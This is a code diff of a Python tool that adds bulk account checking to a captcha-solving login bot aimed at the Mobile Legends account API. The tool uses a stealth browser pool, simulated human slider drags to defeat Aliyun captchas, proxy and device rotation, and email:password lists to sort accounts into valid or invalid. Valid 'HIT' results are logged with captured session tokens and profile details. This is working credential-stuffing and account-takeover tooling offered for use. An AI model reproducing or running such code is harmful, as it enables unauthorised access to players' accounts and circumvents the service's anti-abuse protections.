@@ -1,31 +1,20 @@
 # -*- coding: utf-8 -*-
 # author: Tyraaah
 """
-app.py — WAF Solver (browser-backed, warm-page pool)
+app.py — WAF Solver (browser-backed, warm-page pool) + Account Checker
 
-Architecture:
-  - Shared cloakbrowser instance with a pool of *warm* contexts sitting on
-    LOGIN_PAGE. Each solve borrows a page, fires the login fetch, solves the
-    slider inline, reads the result, then re-arms the page in the background.
-  - /api/solve : main endpoint. Full login in a real browser page.
-                 If email/password omitted → fast WAF-clearance probe that
-                 REGISTERS a reusable session (sid + cookies) into the pool.
-  - /api/waf   : legacy prefetch — now also uses the warm pool and registers,
-                 but only returns a session if the slider was actually solved
-                 (or an acw cookie was already present).
-  - /api/token : accepts externally-solved tokens.
-  - --launch   : N kontolsolver.WAFSolver slots (kept for compatibility).
+Login response shapes supported (all classified as 'valid'):
+  A) {code:0, guid:"...", session:"...", name:"...", left_num:N}  ← modern
+  B) {code:0, u_atoken:"...", u_asig:"..."}                        ← legacy
+  C) {code:0, data:{u_atoken:"...", u_asig:"..."}}                 ← legacy nested
 
-Fixes in this version:
-  - _waf_probe_only: fixed NameError (`slider` → `slider_appeared`); added
-    cookie validation so `/api/solve` probe never returns garbage.
-  - _async_fetch_waf_via_browser: proper slider_solved tracking; refuses to
-    return cookies when the slider never appeared and no acw cookie exists.
-    This eliminates the `html_2786b` errors that the tester was reporting.
-  - Both helpers re-fire the dummy fetch up to 3 times to force the WAF to
-    raise the slider on stale warm-pool pages.
+WAF solving uses the nixv4.py pattern:
+  One fetch, one loop. Poll the fetch promise AND the slider together.
+  When the slider appears, solve it in place. The initial fetch resolves
+  once the slider is solved — never re-fire.
 
-pip install flask curl_cffi cloakbrowser
+pip install flask curl_cffi cloakbrowser requests
+python app.py --check-accounts accounts.txt --workers 3 --retries 3 --headless
 python app.py --launch --slots 4 --headless
 """
 import hashlib, json, sys, time, random, string, threading, uuid, os, re
@@ -64,16 +53,23 @@ _logging.getLogger('werkzeug').addFilter(_QuietPollFilter())
 LOGIN_URL   = 'https://accountmtapi.mobilelegends.com'
 API_URL     = 'https://accountmtapi.mobilelegends.com/'
 LOGIN_PAGE  = 'https://mtacc.mobilelegends.com/v3.0/inapp/loginbyemail'
+PROFILE_URL = 'https://api.mobilelegends.com/api/role/get_self_role'
 MONITOR_KEY = 'ABCD1234'
 HERE        = os.path.dirname(os.path.abspath(__file__))
 
-SESSION_RESET_S = int(os.environ.get('WAF_SESSION_MAX_AGE', '120'))
+SESSION_RESET_S   = int(os.environ.get('WAF_SESSION_MAX_AGE', '120'))
+WARM_SIZE         = int(os.environ.get('WAF_WARM_PAGES', '6'))
+WARM_REBUILD_USE  = int(os.environ.get('WAF_WARM_REBUILD', '20'))
+POLL_INTERVAL     = float(os.environ.get('WAF_POLL_INTERVAL', '0.08'))
+SOLVE_TIMEOUT_S   = int(os.environ.get('WAF_SOLVE_TIMEOUT', '45'))
+MAX_DRAG_ATTEMPTS = 6
+FETCH_TIMEOUT_MS  = int(os.environ.get('WAF_FETCH_TIMEOUT_MS', '30000'))
 
-# ── Tuning knobs (env-overridable) ───────────────────────────
-WARM_SIZE        = int(os.environ.get('WAF_WARM_PAGES', '6'))
-WARM_REBUILD_USE = int(os.environ.get('WAF_WARM_REBUILD', '20'))
-POLL_INTERVAL    = float(os.environ.get('WAF_POLL_INTERVAL', '0.15'))
-SOLVE_TIMEOUT_S  = int(os.environ.get('WAF_SOLVE_TIMEOUT', '45'))
+_DEBUG = os.environ.get('WAF_DEBUG', '1') != '0'
+
+def dbg(msg):
+    if _DEBUG:
+        print(f"  DBG {msg}", flush=True)
 
 TOKEN_FILE = os.path.join(HERE, 'tokens.txt')
 _token_file_lock = threading.Lock()
@@ -85,6 +81,8 @@ FETCH_HEADERS = {
     "Referer": LOGIN_PAGE,
     "Origin": "https://mtacc.mobilelegends.com",
 }
+
+LOGIN_HOSTS = ("accountmtapi.mobilelegends.com",)
 
 # ─────────────────────────────────────────────────────────────
 #  PAYLOAD HELPERS
@@ -101,7 +99,175 @@ def _dummy_payload():
     return _make_payload("waf_probe@example.com", "000000")
 
 # ─────────────────────────────────────────────────────────────
-#  TOKEN SAVE
+#  ABORTABLE FETCH JS (nixv4.py pattern)
+# ─────────────────────────────────────────────────────────────
+def _abortable_fetch_js(body, var_name="__loginPromise",
+                        abort_var="__loginAbort",
+                        timeout_ms=None):
+    if timeout_ms is None:
+        timeout_ms = FETCH_TIMEOUT_MS
+    return (
+        f"(()=>{{"
+        f"try{{if(window.{abort_var})window.{abort_var}.abort();}}catch(e){{}}"
+        f"const ctl=new AbortController();"
+        f"window.{abort_var}=ctl;"
+        f"const tm=setTimeout(()=>{{try{{ctl.abort();}}catch(e){{}}}},{timeout_ms});"
+        f"window.{var_name}=fetch('{API_URL}',{{method:'POST',credentials:'include',"
+        f"headers:{json.dumps(FETCH_HEADERS)},body:{json.dumps(body)},signal:ctl.signal}})"
+        f".then(r=>r.text())"
+        f".catch(e=>'FETCH_ERR:'+((e&&e.name==='AbortError')?'timeout_abort':(e&&e.message||e)))"
+        f".finally(()=>clearTimeout(tm));"
+        f"}})();"
+    )
+
+def _abort_pending_js(abort_var="__loginAbort"):
+    return f"()=>{{try{{if(window.{abort_var})window.{abort_var}.abort();}}catch(e){{}}}}"
+
+# ─────────────────────────────────────────────────────────────
+#  SESSION / TOKEN EXTRACTION (accepts BOTH shapes)
+# ─────────────────────────────────────────────────────────────
+_ASIG_KEYS   = ('u_asig', 'asig', 'u_sign', 'sign_token', 'u_token_sign')
+_ATOKEN_KEYS = ('u_atoken', 'atoken', 'u_token', 'token')
+
+def _extract_session(j):
+    """
+    Normalise a login response into:
+      {guid, session, u_atoken, u_asig, name, left_num,
+       ok: bool, kind: 'session' | 'token' | 'invalid' | 'retry' | 'error'}
+    Accepts BOTH shapes (session-based and legacy token-based).
+    """
+    out = {'guid': '', 'session': '', 'u_atoken': '', 'u_asig': '',
+           'name': '', 'left_num': None, 'ok': False, 'kind': 'retry'}
+
+    if not isinstance(j, dict):
+        return out
+
+    code = j.get('code', -999)
+    data = j.get('data') if isinstance(j.get('data'), dict) else {}
+
+    # Terminal invalid codes
+    if code in (1005, 3301, 3302, 1086, 1087):
+        out['kind'] = 'invalid'
+        return out
+
+    # Terminal retry codes
+    if code in (1013, -2):
+        out['kind'] = 'retry'
+        return out
+
+    if code != 0:
+        out['kind'] = 'error'
+        return out
+
+    # code==0 → success; pull whatever identifying fields exist
+    def pick(*keys):
+        for src in (j, data):
+            if not isinstance(src, dict):
+                continue
+            for k in keys:
+                v = src.get(k)
+                if v not in (None, ''):
+                    return v
+        return ''
+
+    out['guid']    = str(pick('guid', 'roleId', 'role_id') or '')
+    out['session'] = str(pick('session', 'session_id', 'sessionKey') or '')
+    out['name']    = str(pick('name', 'account', 'roleName') or '')
+    ln = pick('left_num', 'leftNum')
+    try:
+        out['left_num'] = int(ln) if ln not in (None, '') else None
+    except Exception:
+        out['left_num'] = None
+
+    # Legacy token fields (search both data and top level)
+    for src in (data, j):
+        if not isinstance(src, dict):
+            continue
+        for k in _ASIG_KEYS:
+            v = src.get(k)
+            if v:
+                out['u_asig'] = v
+                break
+        if out['u_asig']:
+            for k in _ATOKEN_KEYS:
+                v = src.get(k)
+                if v:
+                    out['u_atoken'] = v
+                    break
+            break
+
+    # Success = session OR token
+    if out['guid'] and out['session']:
+        out['ok'] = True
+        out['kind'] = 'session'
+    elif out['u_asig']:
+        out['ok'] = True
+        out['kind'] = 'token'
+
+    return out
+
+
+def _looks_terminal(j):
+    """True if this JSON is the final authenticated (or invalid-code) response."""
+    if not isinstance(j, dict):
+        return False
+    code = j.get('code', -999)
+    if code in (1005, 3301, 3302, 1086, 1087):
+        return True
+    if code != 0:
+        return False
+    s = _extract_session(j)
+    return s['ok']
+
+
+def _classify_result(txt):
+    """
+    Returns (kind, payload).
+    kind ∈ {valid, invalid, retry, error}.
+    For 'valid', payload is a normalised dict with
+      guid, session, u_atoken, u_asig, name, left_num, kind, raw
+    """
+    if not txt:
+        return ('retry', {'message': 'empty'})
+    if txt.startswith('FETCH_ERR'):
+        return ('retry', {'message': txt[:80]})
+    if not txt.strip().startswith('{'):
+        if 'AliyunCaptcha' in txt or 'sceneId' in txt:
+            return ('retry', {'message': 'slider_html'})
+        return ('retry', {'message': f'html_{len(txt)}b'})
+    try:
+        d = json.loads(txt)
+    except Exception:
+        return ('retry', {'message': 'json_parse_fail'})
+
+    code = d.get('code', -999)
+
+    if code in (1013, -2):
+        return ('retry', d)
+    if code in (1005, 3301, 3302, 1086, 1087):
+        return ('invalid', d)
+
+    if code == 0:
+        s = _extract_session(d)
+        if s['ok']:
+            payload = {
+                'guid':     s['guid'],
+                'session':  s['session'],
+                'u_atoken': s['u_atoken'],
+                'u_asig':   s['u_asig'],
+                'name':     s['name'],
+                'left_num': s['left_num'],
+                'kind':     s['kind'],
+                'raw':      d.get('data') or {},
+            }
+            return ('valid', payload)
+        keys = sorted(d.keys())[:12]
+        return ('retry', {'message': 'code0_no_session', 'keys': keys})
+
+    return ('error', d)
+
+# ─────────────────────────────────────────────────────────────
+#  TOKEN SAVE (only when u_asig exists)
 # ─────────────────────────────────────────────────────────────
 def _save_token_url(token_data):
     try:
@@ -129,8 +295,7 @@ def _load_proxies(path):
             raw = [line.strip() for line in f if line.strip()]
         seen = set()
         for p in raw:
-            if p in seen:
-                continue
+            if p in seen: continue
             seen.add(p)
             if '://' in p:
                 PROXIES.append(p)
@@ -285,14 +450,10 @@ def _log(msg, ok=True):
         logs = logs[-200:]
 
 # ─────────────────────────────────────────────────────────────
-#  POOL REGISTRATION (shared by probe, login, waf, slots)
+#  POOL REGISTRATION
 # ─────────────────────────────────────────────────────────────
 def _register_pool_entry(atoken, asig, cookies, dev=None, sid=None,
                          synthetic=False):
-    """
-    Insert a token into the global pool and persist its URL.
-    Returns True if newly added, False if duplicate.
-    """
     global total_ok
     if not asig:
         return False
@@ -312,6 +473,7 @@ def _register_pool_entry(atoken, asig, cookies, dev=None, sid=None,
             'brand':       (dev or {}).get('brand', ''),
             'ver':         (dev or {}).get('ver', ''),
             'synthetic':   bool(synthetic),
+            'sid':         sid or None,
         }
         token_pool.append(entry)
         total_ok += 1
@@ -353,27 +515,24 @@ def _ensure_waf_loop():
 async def _get_waf_browser():
     global _waf_browser
     if _waf_browser is None:
-        license_key = os.environ.get('CLOAKBROWSER_LICENSE_KEY')
-        if not license_key:
-            raise RuntimeError("cloakbrowser_license_missing: set CLOAKBROWSER_LICENSE_KEY")
-        _waf_browser = await launch_async(
-            license_key=license_key,
-            headless=True,
-            humanize=True,
-            human_preset="careful",
-            geoip=bool(PROXIES),
-        )
+        _waf_browser = await launch_async(headless=True, humanize=True)
     return _waf_browser
 
-async def _make_warm_page(browser):
+async def _make_warm_page(browser, wid=0):
     ctx = await browser.new_context(has_touch=True)
     page = await ctx.new_page()
     page.set_default_timeout(25000)
     try:
         await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=30000)
     except Exception as e:
-        print(f"  \033[91m⚠ warm page goto failed: {e}\033[0m", flush=True)
-    return (ctx, page, 0)
+        dbg(f"w{wid} goto failed: {str(e)[:120]}")
+    try:
+        await page.wait_for_selector("#aliyunCaptcha-sliding-slider", timeout=4000)
+        dbg(f"w{wid} WAF slider appeared")
+    except Exception:
+        pass
+    dbg(f"w{wid} page ready (WAF will be solved inline during login)")
+    return (ctx, page, wid, 0)
 
 async def _init_warm_pool():
     global _warm_queue, _warm_browser, _warm_init
@@ -383,12 +542,13 @@ async def _init_warm_pool():
     _warm_queue = asyncio.Queue()
     _warm_init = asyncio.Event()
     async def _prime():
-        for _ in range(WARM_SIZE):
+        for wid in range(WARM_SIZE):
             try:
-                item = await _make_warm_page(_warm_browser)
+                dbg(f"w{wid} navigating...")
+                item = await _make_warm_page(_warm_browser, wid)
                 _warm_queue.put_nowait(item)
             except Exception as e:
-                print(f"  \033[91m⚠ warm prime err: {e}\033[0m", flush=True)
+                print(f"  \033[91m⚠ warm prime err w{wid}: {e}\033[0m", flush=True)
         _warm_init.set()
         print(f"  \033[92m✓ Warm pool ready ({WARM_SIZE} pages)\033[0m", flush=True)
     asyncio.ensure_future(_prime())
@@ -403,41 +563,43 @@ async def _acquire_warm():
     try:
         return await asyncio.wait_for(_warm_queue.get(), timeout=30)
     except asyncio.TimeoutError:
-        return await _make_warm_page(_warm_browser or await _get_waf_browser())
+        browser = _warm_browser or await _get_waf_browser()
+        return await _make_warm_page(browser, 0)
 
-async def _rearm(ctx, page, uses):
+async def _rearm(ctx, page, wid, uses):
     try:
         if uses + 1 >= WARM_REBUILD_USE:
             try: await ctx.close()
             except Exception: pass
             browser = _warm_browser or await _get_waf_browser()
-            item = await _make_warm_page(browser)
+            item = await _make_warm_page(browser, wid)
             _warm_queue.put_nowait(item)
             return
         await page.goto("about:blank", wait_until="commit", timeout=8000)
         await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=20000)
-        _warm_queue.put_nowait((ctx, page, uses + 1))
+        _warm_queue.put_nowait((ctx, page, wid, uses + 1))
     except Exception:
         try: await ctx.close()
         except Exception: pass
         try:
             browser = _warm_browser or await _get_waf_browser()
-            item = await _make_warm_page(browser)
+            item = await _make_warm_page(browser, wid)
             _warm_queue.put_nowait(item)
         except Exception:
             pass
 
-def _spawn_rearm(ctx, page, uses):
-    asyncio.ensure_future(_rearm(ctx, page, uses))
+def _spawn_rearm(ctx, page, wid, uses):
+    asyncio.ensure_future(_rearm(ctx, page, wid, uses))
 
 # ─────────────────────────────────────────────────────────────
-#  TOUCH + DRAG (physics unchanged — calibrated against Aliyun)
+#  TOUCH + DRAG (nixv4.py-style)
 # ─────────────────────────────────────────────────────────────
-async def _touch(cdp, etype, x, y, keep=False):
+async def _dispatch(cdp, etype, x, y, keep=False):
     pts = [] if keep else [{"x": float(x), "y": float(y),
                             "radiusX": 6, "radiusY": 6, "force": 1, "id": 1}]
     try:
-        await cdp.send("Input.dispatchTouchEvent", {"type": etype, "touchPoints": pts})
+        await cdp.send("Input.dispatchTouchEvent",
+                       {"type": etype, "touchPoints": pts})
     except Exception:
         pass
 
@@ -445,64 +607,66 @@ async def _human_drag(ctx, page, sx, sy, dist):
     try:
         cdp = await ctx.new_cdp_session(page)
         R = lambda a, b: a + random.random() * (b - a)
+
         pts = []
         x = 0.0
-        ae = dist * R(0.28, 0.40)
+        acc_end = dist * R(0.28, 0.40)
         for i in range(2 + int(random.random() * 2)):
             x += R(3, 7) * (1 + i * 0.6)
-            if x > ae:
-                x = ae
+            if x > acc_end:
+                x = acc_end
                 break
-            pts.append({"x": x, "d": R(12, 25)})
-        nf = 4 + int(random.random() * 4)
+            pts.append({"x": x, "d": R(6, 12)})
+        nf = 4 + int(random.random() * 3)
         rem = dist - x
         for i in range(nf):
             step = rem / (nf - i) * R(0.8, 1.2)
             if step < 4 or x + step >= dist - 1:
                 break
             x += step
-            pts.append({"x": x, "d": R(4, 9)})
-        pts.append({"x": dist + R(1.5, 4), "d": R(12, 22)})
-        pts.append({"x": dist + R(-1, 1), "d": R(10, 18)})
-        pts.append({"x": dist, "d": R(5, 10)})
-        pts.append({"x": dist, "d": R(5, 10)})
+            pts.append({"x": x, "d": R(2, 5)})
+        pts.append({"x": dist + R(1.5, 3), "d": R(6, 11)})
+        pts.append({"x": dist + R(-1, 1),   "d": R(5, 9)})
+        pts.append({"x": dist,              "d": R(3, 6)})
 
-        await _touch(cdp, "touchStart", sx, sy)
-        await asyncio.sleep(R(15, 30) / 1000)
+        await _dispatch(cdp, "touchStart", sx, sy)
+        await asyncio.sleep(R(8, 15) / 1000)
         for p in pts:
             prog = min(p["x"] / dist, 1.0) if dist > 0 else 0
             wb = 2.6 * math.sin(math.pi * prog)
             dy = wb * 0.3 if p["x"] >= dist else wb * R(0.55, 1.0)
-            await _touch(cdp, "touchMove", sx + p["x"], sy + dy + R(-0.4, 0.4))
+            await _dispatch(cdp, "touchMove", sx + p["x"],
+                            sy + dy + R(-0.4, 0.4))
             await asyncio.sleep(p["d"] / 1000)
-        await _touch(cdp, "touchEnd", sx + dist, sy, keep=True)
+        await _dispatch(cdp, "touchEnd", sx + dist, sy, keep=True)
         return True
     except Exception as e:
         print(f"  \033[91mdrag err: {e}\033[0m", flush=True)
         return False
 
 # ─────────────────────────────────────────────────────────────
-#  SLIDER SOLVE
+#  SLIDER SOLVE (nixv4.py geometry)
 # ─────────────────────────────────────────────────────────────
-async def _solve_waf_in_page(page, ctx):
-    has = False
+async def _solve_waf_in_page(page, ctx, wid=0):
     try:
-        has = await page.evaluate(
+        present = await page.evaluate(
             "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
     except Exception:
-        pass
-    if not has:
+        present = False
+    if not present:
         return True, "no_slider"
 
     try:
         await page.wait_for_function(
             "()=>{const s=document.getElementById('aliyunCaptcha-sliding-slider');"
-            "return s && s.getBoundingClientRect().width>10}",
-            timeout=4000)
+            "if(!s) return false;"
+            "const r=s.getBoundingClientRect();"
+            "return r.width>10 && r.height>10;}",
+            timeout=5000)
     except Exception:
         return False, "slider_not_ready"
 
-    box = await page.evaluate("""()=>{
+    box = await page.evaluate(r"""()=>{
         const s=document.getElementById('aliyunCaptcha-sliding-slider');
         if(!s) return null;
         const r=s.getBoundingClientRect();
@@ -513,44 +677,73 @@ async def _solve_waf_in_page(page, ctx):
     if not box:
         return False, "no_box"
 
+    try:
+        pre_cookies = {c["name"] for c in await ctx.cookies()}
+    except Exception:
+        pre_cookies = set()
+    pre_acw = {n for n in pre_cookies if n.startswith("acw")}
+
+    dist = max(40.0, box.get("mt", 280.0))
+
     verify_ok = {"value": False}
     async def on_response(response):
-        url = response.url
-        if "verify" in url or "slideVerify" in url or "captcha" in url:
-            try:
-                text = await response.text()
-                if '"VerifyResult":true' in text or '"success":true' in text:
-                    verify_ok["value"] = True
-            except Exception:
-                pass
+        url = response.url or ""
+        if not any(k in url for k in
+                   ("verify", "slideVerify", "captcha", "_____tmd_____")):
+            return
+        try:
+            text = await response.text()
+            dbg(f"verify response: {response.status} {url[-70:]} body={text[:100]}")
+            if ('"VerifyResult":true' in text
+                or '"success":true' in text
+                or '"Success":true' in text):
+                verify_ok["value"] = True
+        except Exception:
+            pass
     page.on("response", on_response)
 
     sx = box["x"] + box["w"] / 2
     sy = box["y"] + box["h"] / 2
-    dist = box.get("mt", 280)
-    await _human_drag(ctx, page, sx, sy, dist)
+    dbg(f"sliding {int(dist)}px")
+    dragged = await _human_drag(ctx, page, sx, sy, dist)
 
     solved = False
-    reason = "slider_still_visible"
-    for _ in range(50):
-        if verify_ok["value"]:
-            solved = True; reason = "verify_confirmed"; break
-        try:
-            still = await page.evaluate(
-                "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
-        except Exception:
-            still = True
-        if not still:
+    reason = "drag_failed" if not dragged else "slider_still_visible"
+
+    if dragged:
+        for _ in range(60):
+            if verify_ok["value"]:
+                solved, reason = True, "verify_confirmed"
+                break
             try:
-                cookies = await ctx.cookies()
-                if any('acw' in ck['name'].lower() for ck in cookies):
-                    solved = True; reason = "acw_cookie"
-                else:
-                    reason = "silent_fail"
+                names = {c["name"] for c in await ctx.cookies()}
             except Exception:
-                reason = "silent_fail"
-            break
-        await asyncio.sleep(0.08)
+                names = set()
+            new_acw = {n for n in names if n.startswith("acw")} - pre_acw
+            if new_acw:
+                solved, reason = True, "acw_cookie"
+                break
+            try:
+                still = await page.evaluate(
+                    "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
+            except Exception:
+                still = True
+            if not still:
+                await asyncio.sleep(0.25)
+                if verify_ok["value"]:
+                    solved, reason = True, "hidden_and_cleared"
+                else:
+                    try:
+                        names = {c["name"] for c in await ctx.cookies()}
+                        new_acw = {n for n in names if n.startswith("acw")} - pre_acw
+                        if new_acw:
+                            solved, reason = True, "acw_cookie_after_hide"
+                        else:
+                            reason = "hidden_no_cookie"
+                    except Exception:
+                        reason = "hidden_no_cookie"
+                break
+            await asyncio.sleep(0.08)
 
     try:
         page.remove_listener("response", on_response)
@@ -587,69 +780,130 @@ def _cookie_header(cookies):
     return '; '.join(f"{k}={v}" for k, v in cookies.items() if v is not None)
 
 # ─────────────────────────────────────────────────────────────
-#  CORE: solve + login on one warm page
+#  PROFILE LOOKUP (only works when a token session exists)
 # ─────────────────────────────────────────────────────────────
-async def _solve_and_login(email, password):
+async def _fetch_profile(sess, ua, dev, cookies):
+    if not sess:
+        return {}
+    headers = {
+        "User-Agent": ua,
+        "Accept": "application/json",
+        "X-Requested-With": "com.mobile.legends",
+        "Referer": LOGIN_PAGE,
+        "Origin": "https://mtacc.mobilelegends.com",
+    }
+    headers.update(_make_sec_headers(dev))
+    try:
+        r = sess.post(PROFILE_URL, headers=headers, timeout=12)
+        if r.status_code == 200 and r.text.strip().startswith("{"):
+            return r.json()
+    except Exception:
+        pass
+    return {}
+
+def _format_hit(nick, profile, payload=None):
+    """
+    Render a [ HIT ] line. Uses profile if we got one; otherwise falls back
+    to the session payload (name + guid + session).
+    """
+    data = (profile or {}).get("data") or profile or {}
+    p = payload or {}
+    ign  = data.get("roleName") or data.get("nickname") or p.get('name') or nick
+    lvl  = data.get("roleLevel") or data.get("level") or "?"
+    rank = data.get("gradeName") or data.get("rank") or "?"
+    skin = data.get("skinCount") or data.get("skins") or "?"
+    tier = data.get("tier") or "No Tier"
+    guid = p.get('guid') or data.get('guid') or '-'
+    sess = p.get('session') or '-'
+    return (
+        f" [  HIT  ] {nick}:{nick}  ◆ {tier}\n"
+        f"          └─ {ign} Lv{lvl} Skins:{skin} {rank}\n"
+        f"          └─ GUID:{str(guid)[:14]}… Session:{str(sess)[:10]}…"
+    )
+
+# ─────────────────────────────────────────────────────────────
+#  CORE: inline slider solve + login on one page (nixv4.py pattern)
+# ─────────────────────────────────────────────────────────────
+async def _solve_and_login(email, password, label=None, wid=0):
     if not _HAS_BROWSER:
         return None, {}, "browser_not_available", None
 
+    lbl = label or email
     sid = uuid.uuid4().hex[:16]
     dev = random.choice(DEVICES)
+
     try:
         await _get_waf_browser()
         await _init_warm_pool()
-        ctx, page, uses = await _acquire_warm()
+        ctx, page, w_id, uses = await _acquire_warm()
     except Exception as e:
         return None, {}, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", sid
 
+    wid = w_id
+    fetch_js = _abortable_fetch_js(_make_payload(email, password))
+
     try:
-        body = _make_payload(email, password)
-        headers_js = json.dumps(FETCH_HEADERS)
-        promise_js = (
-            f"fetch('{API_URL}',{{method:'POST',credentials:'include',"
-            f"headers:{headers_js},body:{json.dumps(body)}}}).then(r=>r.text())"
-            f".catch(e=>'FETCH_ERR:'+e);"
-        )
         try:
-            await page.evaluate(f"()=>{{ window.__loginPromise = {promise_js} }}")
+            await page.evaluate(fetch_js)
         except Exception as e:
-            _spawn_rearm(ctx, page, uses)
-            return None, {}, f"eval_error:{type(e).__name__}:{str(e)[:100]}", sid
+            dbg(f"w{wid} initial fetch eval error: {str(e)[:80]}")
 
         txt = ""
         drag_attempt = 0
-        max_polls = int(SOLVE_TIMEOUT_S / POLL_INTERVAL)
+        max_polls = int(SOLVE_TIMEOUT_S / 0.08) + 20
+
         for _poll in range(max_polls):
             try:
-                state = await page.evaluate("""async()=>{
+                combined = await page.evaluate("""async()=>{
                     const slider = !!document.getElementById('aliyunCaptcha-sliding-slider');
-                    if(!window.__loginPromise) return {slider, done:false};
-                    const t = new Promise(r=>setTimeout(()=>r('__PENDING__'),50));
-                    const v = await Promise.race([window.__loginPromise, t]);
-                    return {slider, done: v!=='__PENDING__', value: v};
+                    if (slider) return {slider:true, res:'__PENDING__'};
+                    if (!window.__loginPromise) return {slider:false, res:'__PENDING__'};
+                    const t = new Promise(r=>setTimeout(()=>r('__PENDING__'), 50));
+                    const res = await Promise.race([window.__loginPromise, t]);
+                    return {slider:false, res};
                 }""")
             except Exception:
-                state = {}
+                combined = {"slider": False, "res": "__PENDING__"}
 
-            if state.get("slider"):
-                drag_attempt += 1
-                if drag_attempt <= 3:
-                    ok, _reason = await _solve_waf_in_page(page, ctx)
-                    if not ok:
-                        try:
-                            await page.reload(wait_until="domcontentloaded", timeout=15000)
-                            await page.evaluate(
-                                f"()=>{{ window.__loginPromise = {promise_js} }}")
-                        except Exception:
-                            pass
-                    drag_attempt = 0
-            if state.get("done"):
-                txt = state.get("value") or ""
+            if combined.get("res") and combined["res"] != "__PENDING__":
+                txt = combined["res"]
                 break
 
-            await asyncio.sleep(POLL_INTERVAL)
+            if combined.get("slider"):
+                drag_attempt += 1
+                if drag_attempt > MAX_DRAG_ATTEMPTS:
+                    dbg(f"w{wid} slider retry cap reached ({drag_attempt})")
+                    break
+                dbg(f"w{wid} slider during login, solving (attempt {drag_attempt})...")
+                solved, _reason = await _solve_waf_in_page(page, ctx, wid)
+                if solved:
+                    dbg(f"w{wid} verify confirmed ✓")
+                await asyncio.sleep(0.25)
+                continue
+
+            await asyncio.sleep(0.08)
+
+        if not txt:
+            try:
+                txt = await page.evaluate("""async()=>{
+                    if (!window.__loginPromise) return '';
+                    const t = new Promise(r=>setTimeout(()=>r(''), 2000));
+                    return await Promise.race([window.__loginPromise, t]);
+                }""")
+            except Exception:
+                txt = ""
+
+        try:
+            await page.evaluate(
+                "()=>{try{if(window.__loginAbort)window.__loginAbort.abort()}catch(e){};"
+                "delete window.__loginPromise; delete window.__loginAbort;}")
+        except Exception:
+            pass
 
         cookies = await _collect_cookies(ctx)
+        names = list(cookies.keys())
+        acw = [n for n in names if n.startswith("acw")]
+        dbg(f"w{wid} cookies after solve: {acw[:3]} (total {len(names)})")
 
         try:
             sess, proxy = _make_cffi_session(dev, cookies)
@@ -657,33 +911,25 @@ async def _solve_and_login(email, password):
         except Exception:
             pass
 
-        _spawn_rearm(ctx, page, uses)
+        _spawn_rearm(ctx, page, wid, uses)
 
         if not txt:
             return None, cookies, "timeout_poll", sid
+        if txt.startswith("FETCH_ERR"):
+            return None, cookies, txt[:80], sid
         return txt, cookies, None, sid
 
     except Exception as e:
         try:
-            _spawn_rearm(ctx, page, uses)
+            _spawn_rearm(ctx, page, wid, uses)
         except Exception:
             pass
         return None, {}, f"browser_error:{type(e).__name__}:{str(e)[:120]}", sid
 
 # ─────────────────────────────────────────────────────────────
-#  FAST PROBE — now REGISTERS a reusable session
-#  [FIX] `slider` → `slider_appeared` NameError.
-#  [FIX] Only solve the slider if it actually appeared; if not and
-#        no acw cookie exists, fail so the caller retries.
+#  FAST PROBE
 # ─────────────────────────────────────────────────────────────
 async def _waf_probe_only():
-    """
-    Fire a dummy login fetch to trigger WAF, solve the slider, then
-    REGISTER the resulting session (sid + cookies + cffi session) so it
-    shows up in /api/status, /api/tokens, /api/token-url, /api/check.
-
-    Returns: (ok, err, sid, cookies)
-    """
     if not _HAS_BROWSER:
         return None, "browser_not_available", None, {}
 
@@ -693,67 +939,76 @@ async def _waf_probe_only():
     try:
         await _get_waf_browser()
         await _init_warm_pool()
-        ctx, page, uses = await _acquire_warm()
+        ctx, page, wid, uses = await _acquire_warm()
     except Exception as e:
         return None, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", None, {}
 
     try:
-        # Trigger WAF with a dummy fetch. Ignore result; we only need the
-        # side-effect of the slider / acw cookie.
+        slider_appeared = False
+        ok = False
+        reason = "no_slider"
+
+        for attempt in range(3):
+            try:
+                await page.evaluate(_abortable_fetch_js(
+                    _dummy_payload(), var_name="__wafProbe",
+                    abort_var="__wafProbeAbort", timeout_ms=8000))
+            except Exception:
+                pass
+
+            try:
+                await page.wait_for_selector(
+                    "#aliyunCaptcha-sliding-slider", timeout=3000)
+                slider_appeared = True
+            except Exception:
+                slider_appeared = False
+
+            if slider_appeared:
+                ok, reason = await _solve_waf_in_page(page, ctx, wid)
+                if ok:
+                    for _ in range(15):
+                        cookies = await _collect_cookies(ctx)
+                        if any(k.startswith("acw") for k in cookies):
+                            break
+                        await asyncio.sleep(0.1)
+                    break
+            else:
+                try:
+                    names_lower = {k.lower() for k in (await _collect_cookies(ctx)).keys()}
+                except Exception:
+                    names_lower = set()
+                if "acw_tc" in names_lower or "acw_sc__v2" in names_lower:
+                    ok, reason = True, "acw_already_present"
+                    break
+
+            if attempt < 2:
+                try:
+                    await page.goto("about:blank", wait_until="commit", timeout=5000)
+                    await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=15000)
+                except Exception:
+                    pass
+                await asyncio.sleep(0.4)
+
         try:
-            await page.evaluate(f"""() => {{
-                fetch('{API_URL}', {{
-                    method: 'POST', credentials: 'include',
-                    headers: {json.dumps(FETCH_HEADERS)},
-                    body: {json.dumps(_dummy_payload())}
-                }}).catch(() => {{}})
-            }}""")
+            await page.evaluate(
+                "()=>{try{if(window.__wafProbeAbort)window.__wafProbeAbort.abort()}catch(e){};"
+                "delete window.__wafProbe; delete window.__wafProbeAbort;}")
         except Exception:
             pass
 
-        # Wait for slider — re-fire the dummy fetch if it doesn't appear.
-        slider_appeared = False
-        for attempt in range(3):
-            try:
-                await page.wait_for_selector(
-                    "#aliyunCaptcha-sliding-slider", timeout=2500)
-                slider_appeared = True
-                break
-            except Exception:
-                if attempt < 2:
-                    try:
-                        await page.evaluate(f"""() => {{
-                            fetch('{API_URL}', {{
-                                method: 'POST', credentials: 'include',
-                                headers: {json.dumps(FETCH_HEADERS)},
-                                body: {json.dumps(_dummy_payload())}
-                            }}).catch(() => {{}})
-                        }}""")
-                    except Exception:
-                        pass
-                    await asyncio.sleep(0.3)
-
-        # [FIX] Only call the solver if the slider actually appeared.
-        # Previous code used the undefined name `slider` here, causing
-        # `NameError: name 'slider' is not defined` on every probe.
-        ok = True
-        reason = "no_slider"
